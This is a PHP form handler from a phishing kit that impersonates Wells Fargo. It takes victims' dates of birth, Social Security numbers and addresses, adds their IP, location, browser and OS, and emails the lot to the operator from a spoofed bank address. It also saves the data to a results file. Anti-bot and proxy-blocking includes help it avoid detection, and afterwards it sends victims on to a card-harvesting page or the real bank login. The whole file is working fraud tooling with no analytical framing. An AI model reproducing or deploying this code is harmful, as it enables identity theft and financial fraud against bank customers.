<?php
ob_start();
session_start();
include('../../Against_bot/east_a/useragent_bot.php');
require '../../Against_bot/east_b/main.php';
include('../../panel/config.php');
include '../../Against_bot/east_b/random.php';

if ($api_protection =="true") {
	include('../../Against_bot/east_b/proxyblock.php');
}



if(isset($_POST['street'])&&isset($_POST['city'])&&isset($_POST['zip'])&&isset($_POST['token'])&&isset($_POST['spox'])){

    $v_ip = $_SERVER['REMOTE_ADDR'];
    $VictimInfo1 = "| Submitted by : https://www.geodatatool.com/en/?ip=$v_ip  ";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3r4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    
    $message = "+ ----- [ ❤️East code❤️ ] -----+\n";
    $message .="| Date of birth : {$_POST['dateOfBirth']}\r\n";
    $message .="| SSN number : {$_POST['ssn']}\r\n";
    $message .="| Street address : {$_POST['street']}\r\n";
    $message .="| Zip Code : {$_POST['zip']}\r\n";
    $message .= "+ --------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ----------------------------+\n";
    $subject = "$v_ip (👳 WELLSFARGO CONTACT) \n";
    $head = "Content-type:text/plain;charset=UTF-8\r\n";
    $head ="From: WELLSFARGO <wells@eastcoder.com>\r\n";
	
	@mail($your_email,$subject,$message,$head);
    $save=fopen("../resultz/contact.txt","a+");
	fwrite($save,$message);
	fclose($save);  
		
		
		$key = substr(sha1(mt_rand()),1,25);
    if ($show_credit_card=="yes") {
	   die($comps->headerX("../../oam/credit_verification?origin=".$redirect."&langPref=".$cn.""));
    }
    if ($show_success_page=="yes") {
	   die($comps->headerX("../../oam/logout?origin=".$redirect."&langPref=".$cn.""));
    }
                        
	else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2koaH3G")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>